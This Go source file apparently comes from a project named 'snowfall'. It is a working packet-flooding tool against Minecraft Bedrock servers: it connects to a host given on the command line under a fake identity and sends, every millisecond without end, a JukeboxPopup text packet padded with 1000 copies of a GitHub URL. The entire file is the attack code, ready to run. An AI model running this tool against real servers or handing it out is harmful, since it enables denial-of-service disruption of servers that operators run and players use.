package main

import (
	"fmt"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/protocol/login"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"log"
	"os"
	"time"
)

func main() {
	var (
		address    string
		parameters []string
	)

	if len(os.Args) != 2 {
		fmt.Printf(`USAGE:
    go run main.go <HOST>:<PORT>

Made with ❤️ by inotflying`)
		os.Exit(0)
	}

	address = os.Args[1]

	log.Println("Connecting to the server...")

	conn, err := minecraft.Dialer{
		KeepXBLIdentityData: false,
		IdentityData: login.IdentityData{
			DisplayName: "snowfall",
		},
	}.Dial("raknet", address)
	if err != nil {
		log.Fatalln(err.Error())
	}

	defer func() {
		err = conn.Close()
		if err != nil {
			log.Fatalln(err.Error())
		}
	}()

	log.Printf("Successful connected")

	for i := 0; i < 1000; i++ {
		parameters = append(parameters, "github.com/inotflying/snowfall")
	}

	for {
		err := conn.WritePacket(&packet.Text{
			TextType:   packet.TextTypeJukeboxPopup,
			Parameters: parameters,
		})
		if err != nil {
			return
		}
		time.Sleep(time.Millisecond)
	}
}
